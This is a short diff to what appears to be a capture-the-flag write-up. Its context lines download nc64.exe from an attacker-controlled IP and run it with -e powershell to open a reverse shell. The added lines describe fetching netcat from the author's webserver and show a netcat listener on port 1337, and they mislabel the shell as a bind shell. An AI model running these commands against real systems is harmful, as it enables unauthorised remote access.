@@ -593,4 +593,11 @@ wget http://10.10.14.61/nc64.exe -o C:\ProgramData\nc64.exe
 C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1337
 ```
 
-Ill then add the 
+Ill then add the code to fetch netcat from my webserver then send a bind shell
+
+```python
+❯❯❯ rlwrap nc -lnvp 1337
+listening on [any] 1337 ...
+```
+
+
